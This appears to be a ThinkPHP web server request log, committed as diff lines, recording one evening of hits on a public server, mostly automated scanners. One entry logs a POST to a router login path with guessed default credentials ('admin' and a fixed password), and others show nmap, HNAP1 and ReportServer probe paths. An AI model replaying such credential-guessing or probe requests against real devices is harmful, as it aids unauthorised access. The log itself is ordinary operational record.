+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:68.0) Gecko/20100101 Firefox/68.0',
+  'host' => '101.37.13.45',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T20:36:47+08:00 ] 185.100.87.191 POST 101.37.13.45/sdk
+[运行时间：0.016288s] [吞吐率：61.39req/s] [内存消耗：1,832.43kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'sdk',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:68.0) Gecko/20100101 Firefox/68.0',
+  'host' => '101.37.13.45',
+  'connection' => 'close',
+  'content-length' => '441',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T20:36:51+08:00 ] 185.100.87.191 GET 101.37.13.45/evox/about
+[运行时间：0.017100s] [吞吐率：58.48req/s] [内存消耗：1,831.76kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'evox',
+    1 => 'about',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:68.0) Gecko/20100101 Firefox/68.0',
+  'host' => '101.37.13.45',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T20:36:53+08:00 ] 185.100.87.191 GET 101.37.13.45/nmaplowercheck1610455005
+[运行时间：0.015213s] [吞吐率：65.73req/s] [内存消耗：1,832.07kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'nmaplowercheck1610455005',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:68.0) Gecko/20100101 Firefox/68.0',
+  'host' => '101.37.13.45',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T20:36:54+08:00 ] 185.100.87.191 GET 101.37.13.45/HNAP1
+[运行时间：0.016580s] [吞吐率：60.31req/s] [内存消耗：1,831.66kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'HNAP1',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:68.0) Gecko/20100101 Firefox/68.0',
+  'host' => '101.37.13.45',
+  'connection' => 'close',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T21:09:48+08:00 ] 192.241.209.234 GET 101.37.13.45/ReportServer
+[运行时间：0.017489s] [吞吐率：57.18req/s] [内存消耗：1,831.88kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'ReportServer',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T21:31:09+08:00 ] 103.110.19.202 GET 101.37.13.45:80/
+[运行时间：0.016892s] [吞吐率：59.20req/s] [内存消耗：1,758.86kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45:80',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T22:17:03+08:00 ] 192.227.223.50 POST 101.37.13.45:80/boaform/admin/formLogin
+[运行时间：0.016935s] [吞吐率：59.05req/s] [内存消耗：1,834.16kb] [文件加载：35]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'boaform',
+    1 => 'admin',
+    2 => 'formLogin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45:80',
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-language' => 'en-GB,en;q=0.5',
+  'accept-encoding' => 'gzip, deflate',
+  'origin' => 'http://101.37.13.45:80',
+  'connection' => 'keep-alive',
+  'referer' => 'http://101.37.13.45:80/admin/login.asp',
+  'upgrade-insecure-requests' => '1',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'content-length' => '29',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'admin',
+  'psd' => 'Feefifofum',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T22:29:55+08:00 ] 206.189.209.162 POST 101.37.13.45/
+[运行时间：0.014974s] [吞吐率：66.78req/s] [内存消耗：1,759.14kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+  'user-agent' => 'WinHttpClient',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+  'content-length' => '126',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T23:10:56+08:00 ] 93.162.118.56 GET 101.37.13.45/
+[运行时间：0.014326s] [吞吐率：69.80req/s] [内存消耗：1,758.20kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2021-01-12T23:52:06+08:00 ] 103.216.185.77 GET 101.37.13.45:80/
+[运行时间：0.016260s] [吞吐率：61.50req/s] [内存消耗：1,758.87kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'authorization' => '',
+  'host' => '101.37.13.45:80',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
+  'content-length' => '0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
+[ info ] [ LOG ] INIT File
